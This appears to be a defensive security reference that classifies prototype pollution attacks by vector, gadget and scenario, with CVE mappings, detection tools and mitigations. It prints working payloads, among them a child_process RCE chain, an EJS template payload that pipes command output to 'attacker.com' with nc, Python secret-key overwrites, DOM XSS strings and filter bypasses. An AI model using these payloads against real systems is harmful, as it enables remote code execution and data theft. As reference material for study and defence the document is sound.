# Prototype Pollution Mutation/Variation Taxonomy

---

## Classification Structure

Prototype Pollution is a vulnerability class rooted in JavaScript's prototype-based inheritance model, where an attacker injects arbitrary properties into an object's root prototype (`Object.prototype`) at runtime. Because all JavaScript objects inherit from `Object.prototype`, a single successful pollution contaminates every object in the application, enabling attacks from Denial of Service to Remote Code Execution.

This taxonomy organizes the full mutation space along three axes:

**Axis 1 — Pollution Vector (HOW the prototype is polluted):** The structural mechanism through which attacker-controlled data reaches the prototype chain. This is the primary axis and structures the main body of the document.

**Axis 2 — Exploitation Gadget (WHAT is triggered after pollution):** The type of code gadget that reads from the polluted prototype and produces a security-sensitive effect. This cross-cutting axis explains WHY each pollution matters — without a reachable gadget, pollution alone has no impact.

**Axis 3 — Attack Scenario (WHERE it is weaponized):** The deployment context and impact class that determines real-world severity.

### Axis 2 Summary — Gadget Types

| Gadget Type | Mechanism | Typical Impact |
|---|---|---|
| **Property Override** | Application reads an undefined property, receives attacker's value | Auth bypass, config manipulation |
| **Template/AST Injection** | Template engine consumes polluted AST nodes or compiler options | RCE via template compilation |
| **Child Process Injection** | Spawned process inherits polluted env vars or arguments | RCE via `child_process` |
| **Environment Variable Injection** | Polluted properties spill into `process.env` of child processes | RCE, privilege escalation |
| **Path/File Manipulation** | File paths or module resolution reads polluted values | Path traversal, arbitrary file read |
| **DOM Sink Activation** | Browser DOM APIs consume polluted properties | XSS, script injection |
| **Sanitizer Bypass** | Security sanitizer's config is overridden via polluted properties | XSS, filter bypass |
| **Denial of Service** | Critical runtime properties are overwritten | Application crash, infinite loops |

### Foundational Mechanism

JavaScript's prototype chain works as follows: when a property is accessed on an object and not found, the engine traverses `obj.__proto__` → `Object.prototype` → `null`. If an attacker writes `Object.prototype.isAdmin = true`, then every object where `isAdmin` is not explicitly defined will return `true`. This single mechanism underpins the entire vulnerability class.

The pollution itself is inert — damage requires a **gadget**: any code path that reads an undefined property and uses it in a security-sensitive operation. The separation of **pollution source** (Axis 1) from **exploitation gadget** (Axis 2) is fundamental to understanding this attack surface.

---

## §1. Recursive Merge / Deep Copy Operations

The most prevalent pollution vector. Any function that recursively copies properties from a source object into a destination object without validating keys can serve as a pollution entry point.

### §1-1. Unsafe Deep Merge

When a merge function encounters a nested object, it recursively descends into sub-objects. If the source contains `__proto__` as a key, the merge follows it into `Object.prototype` and assigns properties there.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`__proto__` key injection** | `merge({__proto__: {isAdmin: true}}, target)` traverses into `Object.prototype` | Merge function does not filter `__proto__` |
| **`constructor.prototype` traversal** | `merge({constructor: {prototype: {isAdmin: true}}}, target)` reaches `Object.prototype` via the constructor chain | Merge function does not filter `constructor` |
| **Nested `__proto__` bypass** | Input like `__pro__proto__to__` bypasses single-pass string sanitization that strips `__proto__` once | Sanitizer uses non-recursive string replacement |
| **Dot-notation path traversal** | Libraries accepting `a.b.c` paths (e.g., `lodash.set()`, `dset()`) allow `__proto__.polluted` | Path-based setter does not block prototype keys |

**Example — `__proto__` merge:**
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Example — `constructor.prototype` merge:**
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

**Affected libraries (historical and recent):** `lodash.merge`, `lodash.set`, `lodash.setWith`, `lodash.defaultsDeep`, `dset`, `deep-merge`, `deepmerge`, `mini-deep-assign`, `hoek`, `mixin-deep`, `merge-deep`, `defaults-deep`, `@75lb/deep-merge`, `@agreejs/shared`.

### §1-2. Unsafe Deep Clone / Copy

Deep clone operations create new objects by recursively copying all properties. The same traversal logic that makes merge vulnerable applies to clone operations.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Recursive clone pollution** | Clone function copies `__proto__` properties into the new object's prototype chain | Clone uses `for...in` without `hasOwnProperty` check |
| **`JSON.parse()` round-trip** | `JSON.parse('{"__proto__":{"x":1}}')` creates an object with a `__proto__` own property; subsequent merge into another object pollutes | The parsed object is merged, not used directly |
| **Spread operator with nested `__proto__`** | Shallow spread `{...obj}` is safe for top-level but nested `__proto__` survives if subsequently deep-merged | Multi-step processing where shallow copy feeds into deep merge |

### §1-3. Property Assignment via Path Notation

Libraries that support setting nested properties via string paths (e.g., `a.b.c` or `a[b][c]`) are vulnerable when the path contains prototype-accessing segments.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Dot-path setter** | `set(obj, '__proto__.polluted', 'value')` | Library does not validate path segments |
| **Bracket-path setter** | `set(obj, ['__proto__', 'polluted'], 'value')` | Array-based path allows `__proto__` elements |
| **Mixed notation** | `set(obj, 'constructor.prototype.polluted', 'value')` | No filtering of `constructor` in path |

**Affected libraries:** `lodash.set`, `lodash.setWith`, `dset`, `pydash.set_` (Python equivalent), `object-path`, `dot-prop` (older versions).

---

## §2. User Input Deserialization Entry Points

This category covers the mechanisms through which attacker-controlled data enters the application in a form that can trigger pollution when processed.

### §2-1. JSON Body Parsing

The most direct entry point. HTTP request bodies parsed with `JSON.parse()` naturally support `__proto__` as a key since JSON treats all keys as arbitrary strings.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct JSON body** | POST body `{"__proto__":{"admin":true}}` parsed and merged into config/user object | Express/Koa/Fastify with body-parser and subsequent merge |
| **Nested JSON in string field** | A string field contains JSON that is subsequently parsed: `{"data":"{\"__proto__\":{\"x\":1}}"}` | Double-parsing pattern |
| **JSON5 parsing** | JSON5 parsers (e.g., `json5` package) have historically been vulnerable to prototype pollution during parsing itself | Parser version with CVE (e.g., GHSA-9c47-m6qq-7p4h) |

### §2-2. URL Query String Parsing

Custom query string parsers that support nested object creation are particularly dangerous because they allow specifying deep object structures from URL parameters.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Bracket notation** | `?__proto__[isAdmin]=true` parsed into `{__proto__: {isAdmin: 'true'}}` | Query parser supports bracket nesting (e.g., `qs`, `jQuery.deparam`) |
| **Dot notation** | `?__proto__.isAdmin=true` | Query parser supports dot-based nesting |
| **Array index notation** | `?__proto__[0]=value` treated as object assignment | Parser converts numeric indices to object keys |

### §2-3. URL Fragment / Hash Parsing

Client-side applications often parse the URL hash to extract configuration or state parameters.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Hash parameter parsing** | `#__proto__[transport_url]=data:,alert(1)` | Client-side code parses fragment with vulnerable deparam-style function |
| **Hash-based routing injection** | SPA router extracts parameters from hash and merges into state object | Router uses unsafe merge for state hydration |

### §2-4. FormData Processing

HTML form submissions and multipart data can encode nested objects through field naming conventions.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Bracket-named form fields** | `<input name="__proto__[isAdmin]" value="true">` | Server-side form parser builds nested objects from field names (e.g., tRPC `formDataToObject`, CVE-2025-68130) |
| **Dot-named form fields** | `<input name="__proto__.isAdmin" value="true">` | Parser supports dot notation for nesting |

### §2-5. GraphQL / API-Specific Inputs

GraphQL and other structured API formats can transmit prototype-polluting payloads through their native input mechanisms.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **GraphQL mutation variables** | Variables object containing `__proto__` keys merged into backend model | Backend merges raw variables without sanitization |
| **gRPC/Protocol Buffer to JSON** | Proto-to-JSON conversion produces objects with `__proto__` keys | Deserializer does not filter prototype keys |

### §2-6. React Server Components (RSC) Protocol Deserialization

A critical modern vector where the RSC Flight protocol deserializes payloads that can traverse the prototype chain.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **RSC payload injection** | Crafted deserialization payload exploits prototype chain traversal to access `Function` constructor | React 19.0–19.2.0, Next.js affected versions (CVE-2025-55182 / CVE-2025-66478, CVSS 10.0) |
| **Server Function argument pollution** | Server Action arguments deserialized without validation allow prototype manipulation | Application uses React Server Components with server functions |

---

## §3. Framework and Library Binding Mechanisms

Frameworks that automatically bind user input to internal objects create implicit pollution vectors.

### §3-1. Express.js / Koa / Fastify Middleware Chains

Express and similar frameworks parse query strings and request bodies into JavaScript objects that flow through middleware chains.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`qs` library nesting** | Express default query parser (`qs`) supports nested objects: `?a[b][c]=1` | Default Express configuration with subsequent merge |
| **Body parser + merge** | `req.body` from `body-parser` JSON middleware merged into application object | Application merges user input without key filtering |
| **Parameter limit bypass** | Polluting `parameterLimit` changes how `qs` parses subsequent requests | Server-side pollution persists across requests |

### §3-2. ORM / Database Binding

Object-Relational Mapping layers that accept arbitrary key-value pairs from user input and map them to model properties.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Mongoose schema bypass** | Non-strict schemas accept `__proto__` as a field, merged during `Object.assign` | Schema not using `strict: true` |
| **Query filter injection** | MongoDB query operators injected via polluted properties: `{__proto__: {$gt: ""}}` | Filter objects built from user input without sanitization |

### §3-3. tRPC / Next.js App Router

Modern full-stack frameworks with automatic input binding.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **tRPC `formDataToObject`** | Recursively processes FormData field names with bracket/dot notation without sanitizing `__proto__`, `constructor`, or `prototype` keys | tRPC 10.27.0–10.45.2, 11.0.0–11.7.0 (CVE-2025-68130) |
| **Next.js `experimental_nextAppDirCaller`** | App Router caller processes user input through vulnerable deserialization | Using experimental caller API |

---

## §4. Client-Side Pollution Vectors

Client-side prototype pollution targets browser JavaScript environments, typically exploitable through URL manipulation without authentication.

### §4-1. URL-to-Object Parsing

Client-side libraries that convert URL parameters into JavaScript objects.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`jQuery.deparam()` pollution** | Parses query string into nested object: `?__proto__[innerHTML]=<img/src/onerror=alert(1)>` | Page includes jQuery BBQ or similar deparam library |
| **Custom URL parser** | Application-specific parsers that split on `[` and `.` without prototype guards | Any custom URL-to-object conversion |
| **`URLSearchParams` misuse** | Application iterates `URLSearchParams` and builds nested objects via bracket parsing | Manual nested object construction from URL params |

### §4-2. Client-Side DOM Gadgets

Once client-side pollution succeeds, DOM gadgets convert the pollution into visible impact.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`innerHTML` override** | Polluted `innerHTML` property consumed by DOM manipulation library | Library reads `innerHTML` from config/options object |
| **`transport_url` / script `src`** | Polluted URL property injected as script source: `data:,alert(1)` | Application dynamically creates script elements from options |
| **`srcdoc` / `sandbox` override** | Iframe attributes read from polluted prototype | Application creates iframes with options from object |
| **Event handler injection** | `onerror`, `onload` attributes read from polluted prototype | Elements created with attributes from unvalidated options |

### §4-3. Third-Party Library Gadgets

Widely-used client-side libraries contain gadgets that become exploitable when the prototype is polluted.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **DOMPurify bypass** | Polluting `ALLOWED_TAGS`, `ALLOW_DATA_ATTR`, or similar config properties bypasses sanitization | Specific DOMPurify versions where config reads from prototype |
| **Google Closure gadgets** | Closure library reads undefined properties from prototype for DOM operations | Page uses Google Closure |
| **Backbone.js / Marionette.js** | Template rendering reads options from prototype | Application uses Backbone with client-side templates |
| **Adobe DTM (Dynamic Tag Management)** | Tag manager reads configuration from polluted properties | Page includes Adobe DTM scripts |
| **jQuery gadgets** | Various jQuery plugins read options from prototype-inherited properties | Plugins using `$.extend(true, defaults, options)` pattern |

---

## §5. Server-Side Exploitation Gadgets (Node.js)

The most impactful gadgets exist in the Node.js runtime itself and in server-side libraries, enabling escalation from prototype pollution to RCE.

### §5-1. `child_process` Module Gadgets

The `child_process` module is the primary RCE sink. When a child process is spawned, polluted prototype properties spill into the process environment and arguments.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`shell` property injection** | Polluting `shell` property causes `spawn()` to use attacker-controlled shell: `{__proto__: {shell: "/proc/self/environ"}}` | Application calls `child_process.spawn()` or `fork()` |
| **`NODE_OPTIONS` injection** | Polluting `NODE_OPTIONS` with `--require /proc/self/environ` causes child Node.js processes to load attacker-controlled code | Child process is a Node.js program; Linux environment exposes `/proc/self/environ` |
| **`argv0` injection** | Polluting `argv0` controls the first argument visible to the spawned process | `child_process.spawn()` or `fork()` without explicit `argv0` |
| **`env` property injection** | Polluting `env` injects environment variables into child processes: `{__proto__: {env: {NODE_OPTIONS: "--require /tmp/evil.js"}}}` | Any child process spawn without explicit `env` option |
| **`execPath` manipulation** | Polluting `execPath` controls which binary is executed for `fork()` | `child_process.fork()` without explicit `execPath` |
| **`cwd` manipulation** | Polluting `cwd` changes working directory for spawned processes | Path-dependent child process operations |

**Classic exploit chain:**
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/environ",
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ",
      "A": "console.log(require('child_process').execSync('id').toString())//"
    }
  }
}
```

### §5-2. Template Engine Gadgets

Template engines compile templates into executable code, and many read compiler options from object properties that can be polluted.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **EJS `escapeFunction` override** | Polluting `client` and `escapeFunction` injects code into the compiled template function | Application uses EJS for rendering (CVE in EJS v3.1.10) |
| **EJS `outputFunctionName` injection** | Polluting `outputFunctionName` injects arbitrary code into the template compilation output | EJS templates compiled with polluted options |
| **Pug AST injection** | Polluting AST node properties (e.g., `block.type`, `line`) modifies the compiled template output | Application uses Pug/Jade template engine |
| **Handlebars helper injection** | Polluting `allowProtoPropertiesByDefault` or helper resolution paths | Application uses Handlebars |
| **Nunjucks filter/extension injection** | Polluting filter definitions or extension paths | Application uses Nunjucks |

**Example — EJS RCE:**
```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc attacker.com 4444')"
  }
}
```

### §5-3. Runtime-Level Universal Gadgets

Gadgets discovered in the Node.js and Deno runtime source code itself (not in third-party libraries). These are "universal" because they affect any application running on the vulnerable runtime.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Arbitrary Code Execution (19 gadgets in Node.js)** | Runtime functions read undefined options from prototype, reaching `eval()`, `Function()`, or `child_process` | Any prototype pollution in Node.js application (GHunter, USENIX 2024) |
| **Privilege Escalation (31 gadgets in Node.js)** | Polluted properties modify permission checks, file system access controls, or network configurations | Runtime version with unpatched gadgets |
| **Path Traversal (13 gadgets in Node.js)** | File path resolution reads polluted components | File operations without explicit path normalization |
| **Deno Runtime Gadgets (67 gadgets)** | Despite Deno's permission-based security model, gadgets exist in internal APIs that bypass resource restrictions when permissions are granted | Deno application with relevant permissions granted |

### §5-4. `require()` and Module Resolution Gadgets

The Node.js module system reads resolution configuration from object properties.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`main` field pollution** | Polluting `main` redirects module resolution to attacker-controlled file | Application uses `require()` on a directory |
| **`exports` field pollution** | Polluting `exports` modifies subpath resolution | ESM or conditional exports resolution |
| **`paths` pollution** | Polluting `require.resolve.paths` or module paths | Dynamic module loading from user-influenced paths |

---

## §6. Non-JavaScript Analogues (Class Pollution)

The prototype pollution concept extends beyond JavaScript to other dynamic languages where class attributes can be modified at runtime.

### §6-1. Python Class Pollution

Python's dynamic attribute model allows traversal through `__class__`, `__base__`, `__init__`, and `__globals__` to reach and modify arbitrary class and module state.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`__class__` traversal** | `instance.__class__.__qualname__ = 'Polluted'` modifies the class definition for all instances | Merge function traverses attributes, not just dict items |
| **`__base__` chain climbing** | `instance.__class__.__base__.__base__.attr = value` pollutes parent classes | Deep inheritance hierarchies with unprotected bases |
| **`__globals__` access** | `instance.__init__.__globals__['secret_key'] = 'attacker_value'` accesses module-level variables | Any function attribute exposes `__globals__` |
| **`__kwdefaults__` pollution** | Overwriting keyword-only parameter defaults changes function behavior for all callers | Merge function allows `__kwdefaults__` traversal |
| **`os.environ` injection** | `__init__.__globals__['subprocess']['os']['environ']['COMSPEC'] = 'cmd /c calc'` hijacks subprocess command resolution | Windows environment, accessible `subprocess` import in globals |

**Example — Python class pollution payload:**
```json
{
  "__class__": {
    "__init__": {
      "__globals__": {
        "SECRET_KEY": "attacker_controlled",
        "app": {
          "config": {
            "SECRET_KEY": "attacker_controlled"
          }
        }
      }
    }
  }
}
```

**Affected libraries:** `pydash.set_()`, `pydash.set_with()`, custom recursive merge functions that use `setattr()`.

### §6-2. Ruby / Other Dynamic Languages

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Ruby open classes** | Ruby's open class model allows runtime modification of any class | Mass assignment without strong parameters |
| **PHP `__wakeup` / magic methods** | Deserialization triggers magic methods that modify class state | Unsafe deserialization of user input |

---

## §7. Sanitization Bypass Techniques

Defenses against prototype pollution often involve input sanitization, but many implementations can be bypassed.

### §7-1. Key Filtering Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **`constructor.prototype` instead of `__proto__`** | Blocklist filters `__proto__` but not `constructor` | Incomplete key blocklist |
| **Nested string bypass** | `__pro__proto__to__` after single-pass strip becomes `__proto__` | Non-recursive string sanitization |
| **Unicode normalization** | Encoded `__proto__` variants (`\u005f\u005fproto\u005f\u005f`) bypass string comparison | Parser normalizes Unicode after filter check |
| **Case variation** | `__PROTO__` or `__Proto__` on case-insensitive systems | Parser is case-insensitive but filter is case-sensitive |
| **Computed property names** | `{["__prot"+"o__"]: {x:1}}` bypasses static analysis | Runtime property key construction |

### §7-2. Structural Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **JSON.parse then merge** | `JSON.parse()` preserves `__proto__` as an own property; subsequent merge pollutes | Two-step processing: parse then merge |
| **Multiple encoding layers** | URL-encoding, base64, or nested JSON wrapping hides `__proto__` from outer filters | Input passes through multiple decode stages |
| **Array-to-object coercion** | Arrays with numeric indices coerced to objects during merge; `{0: {__proto__: {x:1}}}` nested in array position | Merge function processes arrays and objects identically |
| **Prototype method override** | Polluting `String.prototype.includes` to always return `false` bypasses `if (key.includes('__proto__'))` checks | Security check relies on prototype methods (CVE-2024-29016 in `locutus`) |

### §7-3. Detection Evasion (Server-Side)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Asynchronous trigger** | Pollution occurs on one request; gadget triggers on a later, unrelated request | Prototype pollution persists in Node.js process memory |
| **Cross-worker pollution** | Worker threads share prototype chain with main thread | Application uses `worker_threads` |
| **Third-party dependency trigger** | Pollution source is in application code; gadget is in an unrelated dependency | Complex dependency graph with shared prototype chain |

---

## §8. Detection and Non-Destructive Probing Techniques

Techniques for identifying prototype pollution without causing denial of service.

### §8-1. Non-Destructive Server-Side Probes

| Technique | Mechanism | Detection Signal |
|---|---|---|
| **`json spaces` override** | Pollute `json spaces` property → JSON responses gain extra indentation | Response formatting changes (Express.js specific) |
| **Status code override** | Pollute `status` or `statusCode` → HTTP response code changes | Non-standard HTTP status returned |
| **Charset override** | Pollute `content-type` charset → response encoding changes | Content-Type header includes unexpected charset |
| **`__proto__` reflection** | Pollute a property and check if it appears in a response object | Polluted value reflected in API response |
| **Async callback detection** | Pollute `shell`/`NODE_OPTIONS` with Burp Collaborator payload → detect DNS/HTTP callback from child process | Out-of-band interaction received |

### §8-2. Client-Side Detection

| Technique | Mechanism | Detection Signal |
|---|---|---|
| **DOM Invader (Burp Suite)** | Automated browser extension that fuzzes URL parameters with prototype pollution payloads | Browser console alerts, DOM modifications |
| **Property canary** | Set `Object.prototype.canary = 'test'` via URL param and check `({}).canary === 'test'` in console | Canary property accessible on fresh objects |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|---|---|---|---|
| **Client-Side XSS** | Browser, SPA, any page with vulnerable JS library | §4 + §2-2/§2-3 | DOM XSS, data theft, session hijacking |
| **Server-Side RCE** | Node.js application with child_process or template engine | §1 + §2-1 + §5 | Full server compromise |
| **Authentication/Authorization Bypass** | Any JS backend with config-driven access control | §1 + §2-1 | Privilege escalation, unauthorized access |
| **Denial of Service** | Any JS application (server or client) | §1 + §2-1 | Application crash, resource exhaustion |
| **Cache Poisoning** | CDN/proxy caching JSON API responses | §1 + §2-1 → §8-1 observable changes | Serving poisoned responses to all users |
| **Supply Chain Attack** | npm ecosystem, transitive dependency with vulnerable merge | §1-1 (in dependency) | Affects all downstream consumers |
| **Cross-Framework RCE (RSC)** | React 19 + Next.js App Router | §2-6 | Pre-auth RCE (CVSS 10.0) |
| **Python Application Compromise** | Flask/Django with recursive merge | §6-1 + custom merge | Secret key theft, RCE |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §2-6 (RSC deserialization) | CVE-2025-55182 / CVE-2025-66478 (React/Next.js) | **CVSS 10.0**. Pre-auth RCE affecting React 19.0–19.2.0 and Next.js. Public exploits available; in-the-wild exploitation detected Dec 2025. |
| §3-3 (tRPC FormData) | CVE-2025-68130 (@trpc/server) | Prototype pollution via `formDataToObject`. Affects tRPC 10.27.0–10.45.2, 11.0.0–11.7.0. Auth bypass, DoS. |
| §1-1 (lodash) | CVE-2025-13465 (lodash) | Prototype pollution in `lodash.set`/`lodash.setWith` functions. |
| §1-3 (dset path setter) | CVE-2024-21529 (dset) | Prototype pollution via `dset()` function, improper input sanitization. |
| §7-2 (prototype method override) | CVE-2024-29016 (locutus) | `parse_str` security check bypassed by polluting `String.prototype.includes`. |
| §1-1 (deep-merge) | CVE-2024-38986 (@75lb/deep-merge) | All versions vulnerable due to reliance on vulnerable lodash merge. |
| §1-1 (web3-utils) | CVE-2024-21505 (web3-utils) | `format()` and `mergeDeep()` functions vulnerable. High severity. |
| §4 + §5-1 (requirejs) | CVE-2024-38999 (requirejs) | RCE via `s.contexts._.configure`. CVSS 9.8. |
| §1-1 (mini-deep-assign) | CVE-2024-38983 (mini-deep-assign) | Prototype pollution in merge function. |
| §5-1 + §5-3 (Node.js runtime) | 63 gadgets reported (USENIX 2024) | 19 ACE, 31 privilege escalation, 13 path traversal gadgets in Node.js core. |
| §5-3 (Deno runtime) | 67 gadgets reported (USENIX 2024) | Despite Deno's permission model, gadgets bypass resource restrictions when permissions are granted. |
| §5-1 (NPM CLI, Parse Server, Rocket.Chat) | 8 exploitable RCEs (USENIX 2023) | Full RCE in three high-profile applications via universal gadgets. |
| §5-2 (EJS) | RCE in EJS v3.1.10 | `escapeFunction`/`outputFunctionName` gadgets. Template compilation RCE. |
| §5-1 (Kibana) | CVE-2019-7609 (Kibana) | Landmark: `child_process.spawn` env injection → RCE. |
| §4-3 + §4-1 (HubSpot) | Bug bounty | $4,000. Client-side PP via `jQuery.deparam`, initial fix bypassed. |
| §4-1 (Lodash bounty) | Bug bounty | $250. `zipObjectDeep()` method pollution. |
| §4-1 (Web3 game) | Bug bounty | $175. Client-side PP on blockchain game platform. |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Server-Side Prototype Pollution Scanner** (PortSwigger) | Server-side Node.js apps | Non-destructive probing via `json spaces`, `status`, `charset` overrides; async detection via `--inspect` |
| **DOM Invader** (PortSwigger / Burp Suite) | Client-side browser JS | Automated URL parameter fuzzing with prototype pollution payloads, gadget discovery |
| **ppfuzz** (Rust-based) | Client-side web applications | Fast scanning for client-side prototype pollution via URL parameter injection |
| **GHunter** (KTH) | JavaScript runtimes (Node.js, Deno) | Modified V8 engine with dynamic taint analysis to discover universal runtime gadgets |
| **Silent Spring** (KTH) | Node.js libraries and apps | Multi-label static taint analysis (CodeQL-based) to identify pollution sources and universal gadgets |
| **pp-finder** | NPM packages | Static analysis for prototype pollution vulnerable patterns in package source code |
| **Doyensec Gadgets Finder** (Burp extension) | Server-side Node.js apps | Automated discovery of exploitable server-side prototype pollution gadgets |
| **CodeQL queries** (GitHub) | Source code repositories | Static analysis queries detecting `prototype-polluting merge call` patterns |
| **jsfuzz** | NPM packages | Fuzzing-based prototype pollution scanner for Node.js packages |
| **ESLint `no-prototype-builtins`** | Source code (preventive) | Linting rule that flags `hasOwnProperty` calls on objects (related anti-pattern) |

---

## Summary: Core Principles

**The fundamental property** that makes prototype pollution possible is JavaScript's prototype-based inheritance with a mutable shared root. Every ordinary object inherits from `Object.prototype`, and this object is mutable by default. A single write to `Object.prototype` contaminates the entire application's object space. This design choice — mutable shared state at the root of the object hierarchy — is the structural root cause.

**Incremental patches fail** because the attack surface is a product of two independent dimensions: pollution sources (any code that recursively processes user input into objects) and exploitation gadgets (any code that reads undefined properties for security-sensitive operations). Fixing individual merge functions or individual gadgets addresses specific instances but not the combinatorial explosion. A new library with an unsafe merge, or a new code path that reads an undefined property, immediately creates a new exploitable combination. The supply chain amplifies this: a single vulnerable deep-merge function in a transitive dependency can expose thousands of applications.

**A structural solution** requires breaking the fundamental assumption. `Object.freeze(Object.prototype)` prevents mutation of the shared root, eliminating the vulnerability class entirely — but risks breaking code that depends on prototype extensibility. Using `Map` instead of plain objects for key-value data, creating objects with `Object.create(null)` (no prototype chain), schema validation with `additionalProperties: false` (e.g., ajv, Zod), and Node.js `--disable-proto` flag all reduce the attack surface structurally rather than through case-by-case filtering. The 2025 emergence of prototype pollution in React Server Components (CVE-2025-55182, CVSS 10.0) demonstrates that even modern frameworks are not immune — the deserialization boundary remains the critical control point.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- USENIX Security 2024: "GHunter: Universal Prototype Pollution Gadgets in JavaScript Runtimes" — Cornelissen, Shcherbakov, Balliu (KTH)
- USENIX Security 2023: "Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js" — Shcherbakov, Balliu (KTH), Staicu (CISPA)
- ACM Web Conference 2024: "Unveiling the Invisible: Detection and Evaluation of Prototype Pollution Gadgets with Dynamic Taint Analysis"
- PortSwigger Research: "Server-side prototype pollution: Black-box detection without the DoS"
- Datadog Security Labs: "CVE-2025-55182 (React2Shell): Remote code execution in React Server Components and Next.js"
- Akamai Security Research: "CVE-2025-55182: React and Next.js Server Functions Deserialization RCE"
- Microsoft Security Blog: "Defending against the CVE-2025-55182 (React2Shell) vulnerability"
- React Official Blog: "Critical Security Vulnerability in React Server Components" (Dec 2025)
- BlackFan: "Client-side Prototype Pollution" — GitHub repository of gadgets
- KTH-LangSec: "Server-side Prototype Pollution" — GitHub collection of gadgets and exploits
- Doyensec Blog: "Unveiling the Prototype Pollution Gadgets Finder"
- Abdulrah33m's Blog: "Prototype Pollution in Python"
- PayloadsAllTheThings: Prototype Pollution reference
- OWASP: "Prototype Pollution Prevention Cheat Sheet"
- MDN Web Docs: "JavaScript prototype pollution" (Security)
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
- Sonar Research: "Remote Code Execution via Prototype Pollution in Blitz.js"
- YesWeHack: "Probing the Server-Side: Detecting and Exploiting Prototype Pollution"
- Cobalt: "A Pentester's Guide to Prototype Pollution Attacks"
